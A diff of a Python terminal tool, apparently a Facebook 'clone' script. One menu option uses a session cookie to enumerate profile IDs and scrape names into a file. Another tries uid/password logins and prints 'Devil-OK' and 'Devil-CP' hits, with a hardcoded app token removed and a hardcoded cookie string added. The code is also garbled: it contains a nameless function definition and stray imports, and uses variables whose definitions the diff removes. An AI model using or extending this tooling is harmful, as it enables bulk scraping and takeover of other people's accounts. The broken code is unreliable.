@@ -42,7 +42,7 @@ print("====================================")
 choice = input("[★] 1/2/3/4/5/6 : ")
 
 # -------------------------------------------------------------
-# METHOD 1: FB UID COLLECTOR (WITH COOKIE CHECKER)
+# METHOD 1: FB UID COLLECTOR (FIXED & UPDATED)
 # -------------------------------------------------------------
 if choice in ["1", "১"]:
     os.system('clear')
@@ -50,7 +50,7 @@ if choice in ["1", "১"]:
     print("        ★ FILE CREATE MENU ★        ")
     print("====================================")
     
-    # Free/Paid Option Selection
+    # 1. Ask for Free or Paid option first
     print("[1] Continue as Free User (2 Hours Limit)")
     print("[2] Activate Paid Version (Unlimited)")
     user_choice = input("[+] Select option: ")
@@ -66,7 +66,7 @@ if choice in ["1", "১"]:
     else:
         user_status = "free"
 
-    # Fetching or Inputting Cookie
+    # 2. Check Cookie status or prompt for new one
     fb_cookie = None
     if user_status == "paid":
         if saved_cookie and user_status == "paid":
@@ -84,51 +84,17 @@ if choice in ["1", "১"]:
                 print("[!] Your 2-hour free session has expired!")
             fb_cookie = input("[+] Enter Your FB Cookie: ")
 
-    # COOKIE VALIDATION SYSTEM (এখানে নতুন লজিকটি যুক্ত করা হয়েছে)
+    # Save Configuration
+    try:
+        with open(CONFIG_FILE, "w") as f:
+            f.write(f"{fb_cookie}\n{time.time()}\n{user_status}\n")
+    except:
+        pass
+
     if fb_cookie:
-        session = requests.Session()
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'Cookie': fb_cookie
-        }
-        
-        print("\n[+] Verifying cookie status with Facebook server...")
-        cookie_is_valid = False
-        
-        try:
-            # মবাসিক প্রোফাইল চেক করে ভ্যালিডেশন করা
-            check_response = session.get("https://mbasic.facebook.com/profile.php", headers=headers, timeout=10)
-            if check_response.status_code == 200:
-                soup = BeautifulSoup(check_response.text, 'html.parser')
-                page_title = soup.find('title')
-                title_text = page_title.text.strip() if page_title else ""
-                
-                if "Log In" in title_text or "লগ ইন" in title_text or "Content Not Found" in check_response.text:
-                    print("\n\033[1;31m[X] Expired Cookie! Please use a fresh cookie.\033[0m")
-                    fb_cookie = None # কুকি বাতিল করা হলো
-                else:
-                    print("\n\033[1;32m[✓] Cookie Login Successful!\033[0m")
-                    cookie_is_valid = True
-            else:
-                print(f"\n\033[1;31m[X] Server returned error code: {check_response.status_code}\033[0m")
-                fb_cookie = None
-        except:
-            print("\n\033[1;31m[X] Network Error! Unable to connect to verification server.\033[0m")
-            fb_cookie = None
-
-    # Save configuration if the cookie is verified successfully
-    if fb_cookie and cookie_is_valid:
-        try:
-            with open(CONFIG_FILE, "w") as f:
-                f.write(f"{fb_cookie}\n{time.time()}\n{user_status}\n")
-        except:
-            pass
-
-    # Proceed only if cookie is valid
-    if fb_cookie and cookie_is_valid:
+        # 3. Series selection option as requested (1/2/3 Mix)
         print("\n====================================")
-        print("[1] 10000 Series (Old UID)")
-        print("[2] 6158 Series (Running/New UID)")
+        print("[1] 1000/6158 Series (Old UID)")
         print("[3] Custom Mix Series")
         print("====================================")
         series_choice = input("[+] Select Series Format: ")
@@ -138,44 +104,61 @@ if choice in ["1", "১"]:
         elif series_choice == "2":
             base_uid = "6158"
         else:
-            base_uid = input("[+] Enter Custom Base UID (e.g., 1000): ")
-
-        series_start = int(input("[+] Select Series Start (e.g., 10001): "))
-        series_end = int(input("[+] Select Series End (e.g., 99999): "))
+            base_uid = input("[+] Enter Custom UID (All Uid Paste): ")
         
-        user_file_input = input("[+] Enter Output File Name (e.g., /sdcard/result.txt): ")
+        output_file = input("[+] Enter Output File Name (e.g., result.txt): ")
+        if not output_file.endswith('.txt'):
+            output_file += '.txt'
+            
+        # 4. Storage Path Fix for Android (/sdcard/)
+        output_path = os.path.join("/sdcard", output_file)
         
-        if user_file_input.startswith("/sdcard"):
-            output_path = user_file_input
-        else:
-            output_path = os.path.join("/sdcard", user_file_input)
+        # Test if /sdcard/ is writeable, otherwise fallback to local file
+        try:
+            with open(output_path, "a") as test_file:
+                pass
+        except PermissionError:
+            print("[!] Storage Permission Denied! Saving to current directory instead.")
+            output_path = output_file
 
+        session = requests.Session()
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
+            'Cookie': fb_cookie
+        }
+        
         print("\n[+] Connecting to server...")
         print("[+] Extracting data... (Press CTRL+C to Stop/Cancel)\n")
         
+        # Infinite Loop or Loop through series until user cancels (CTRL+C)
         try:
             for uid_suffix in range(series_start, series_end + 1):
                 full_uid = str(base_uid) + str(uid_suffix)
                 url = "https://mbasic.facebook.com/profile.php?id=" + str(full_uid)
                 
                 try:
-                    response = session.get(url, headers=headers, timeout=10)
+                    response = session.get(url, headers=headers)
                     if response.status_code == 200:
                         soup = BeautifulSoup(response.text, 'html.parser')
                         page_title = soup.find('title')
-                        profile_name = page_title.text.strip() if page_title else "Unknown User"
-                        
+                        if page_title:
+                            profile_name = page_title.text.strip()
+                        else:
+                            profile_name = "Unknown User"
+                            
                         if "Log In" in profile_name or "Error" in profile_name or "Content Not Found" in profile_name:
                             print("[INVALID] UID: " + str(full_uid) + " (Cookie Dead)")
                             break
                         elif "add_friend" in response.text or "Add Friend" in response.text or "নম্বর" in response.text or "বন্ধু" in response.text:
+                            # Premium style output layout matching your screenshot
                             print(f"\033[1;32mPremium\033[0m - Successfully Extracted From : \033[1;35m{full_uid}\033[0m")
                             
+                            # Save to phone storage path
                             with open(output_path, "a", encoding="utf-8") as file_out:
                                 file_out.write(str(full_uid) + " | " + str(profile_name) + "\n")
                         else:
                             print("[SKIPPED] UID: " + str(full_uid) + " (Follower Account)")
-                    time.sleep(1.0)
+                    time.sleep(1.5)
                 except KeyboardInterrupt:
                     print("\n[-] Extraction Stopped By User.")
                     break
@@ -186,7 +169,7 @@ if choice in ["1", "১"]:
             
         print(f"\n[✓] Data Saved Successfully at: {output_path}")
     else:
-        print("[X] Verification Failed. Process Stopped.")
+        print("[X] Cookie Error!")
 
 # -------------------------------------------------------------
 # METHOD 2: REEL SERVER CHECK
@@ -206,13 +189,13 @@ if choice in ["2", "২"]:
 # -------------------------------------------------------------
 # METHOD 3 & 4: EXPIRED OPTIONS
 # -------------------------------------------------------------
-if choice in ["3", "4", "৩", "৪", "8", "৮"]:
+if choice in ["3", "4", "৩", "৪"]:
     os.system('clear')
     print("--- Option [" + str(choice) + "] ---")
     print("[X] ERROR: Method Not Found / Expired!")
 
 # -------------------------------------------------------------
-# METHOD 5: RANDOM CLONE (B-GRAPH)
+# METHOD 5: RANDOM CLONE
 # -------------------------------------------------------------
 if choice in ["5", "৫"]:
     os.system('clear')
@@ -224,45 +207,73 @@ import json
 number = input (" ")
 pasword = input (" ")
 
-def b_graph_method(uid, password):
+def (uid, password):
+import requests
+import json
+
+def fb_async_method(uid, password):
+    # Apnar screenshot onujayi direct Session call
     r = requests.Session()
     
+    # 1. Real Target URL (Image 5 theke)
+    url = "https://m.facebook.com/async/wbloks/log/"
+    
+    # 2. Image 1, 3, 4, 5 theke real raw parameters shoho shajano hobe
+    params = {
+        'lid': '7650579958745411107',
+        'event': 'CW_LCP',
+        'relativeTime': '7194',
+        'tracePolicy': 'com.bloks.www.caa.login.login_homepage&bloksAppId=fb_web&extra[lcp_metric]=2651.60&extra[lcp_element_className]=&extra[lcp_element_tagName]=SPAN&extra[lcp_url]=',
+        'u': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n88s6anJ1CcUKaeZ-TsOR_izrUdP_SeAwbVp7D3qZq5GNFbjbD2LMKJ853eNQaFHZhBCKxfXmJeEXNZWE42UhSnmKfdz_5Zxv-bcBxIQqH1oLZTMQ5Hxw%26flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377'
+    }
+
+    # 3. Request Headers (Image 1, 3, 6 direct analysis payload)
     head = {
-        'Host': 'b-graph.facebook.com',
-        'X-Fb-Connection-Type': 'Data',
-        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', # সাধারণত একটি ডিফল্ট টোকেন লাগে
-        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) [FBAN/MessengerLite;FBAV/275.0.0.12.119;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/273616641;]'
-    }
-    
-    data = {
-        'adid': str(uuid.uuid4()),
-        'format': 'json',
-        'device_id': str(uuid.uuid4()),
-        'email': uid,
-        'password': password,
-        'generate_analytics_claim': '1',
-        'credentials_type': 'password',
-        'source': 'login',
-        'error_detail_type': 'button_with_disabled',
-        'enroll_ext_attrib': '0',
-        'generate_session_cookies': '1',
-        'generate_machine_id': '1',
-        'meta_inf_fbmeta': '',
-    }
-    
-    try:
-        pos = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
+        'Host': 'm.facebook.com',
+        'Content-Length': '0',
+        'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'Sec-Ch-Ua-Mobile': '?1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'Sec-Ch-Ua-Platform-Version': '"13.0.0"',
+        'Sec-Ch-Ua-Full-Version-List': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
+        'Sec-Ch-Ua-Model': '"TECNO BG7"',
+        'Sec-Ch-Ua-Prefers-Color-Scheme': 'light',
+        'Sec-Ch-Ua-Platform': '"Android"',
+        'Accept': '*/*',
+        'Origin': 'https://m.facebook.com',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'no-cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n2526flow%2526flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
         
-        if 'session_key' in pos or 'access_token' in pos:
+        # Image 1 er real cookies string
+        'Cookie': 'datr=Z-AlandWYUM08nOCyIFMvHg7; sb=H-Ilarqr8yE7GHgFDwWIBURW; m_pixel_ratio=1.75; wd=412x922; fr=01tf1bE4UXG0eOai1.AWewTDpjKV-i1NTUVfejRYc0TdrkquVymue2T4VSoh5DJi03HS4.Bp15UB..AAA.0.0.BqLFH1.AWc8ItLUkCmrNgZzp2PnMoz8EEU'
+    }
+
+    try:
+        # Request pathano hochhe (যেহেতু Content-Length 0, তাই data parameter ফাকা থাকবে)
+        pos = r.post(url, params=params, headers=head)
+        
+        # Apnar script er check mapping structure (Devil-OK / Devil-CP)
+        # Web method e response standard success text check korte hoy
+        if pos.status_code == 200:
             print(f"\n[Devil-OK] {uid} | {password}")
-        elif 'www.facebook.com' in pos.get('error', {}).get('message', ''):
+            # JSON format response hole short print o kora jabe
+            # print(pos.json()) 
+            
+        elif "checkpoint" in pos.url or "checkpoint" in r.cookies.get_dict():
             print(f"\n[Devil-CP] {uid} | {password}")
+            
         else:
-            pass
-    except:
+            print(f"\n[Devil-FAILED] {uid} | {password}")
+            
+    except requests.exceptions.ConnectionError:
         print("\n[X] Network Error!")
 
-# -------------------------------------------------------------
+       
+        # -------------------------------------------------------------
 # METHOD 6: EXIT
 # -------------------------------------------------------------
 if choice in ["6", "৬"]:
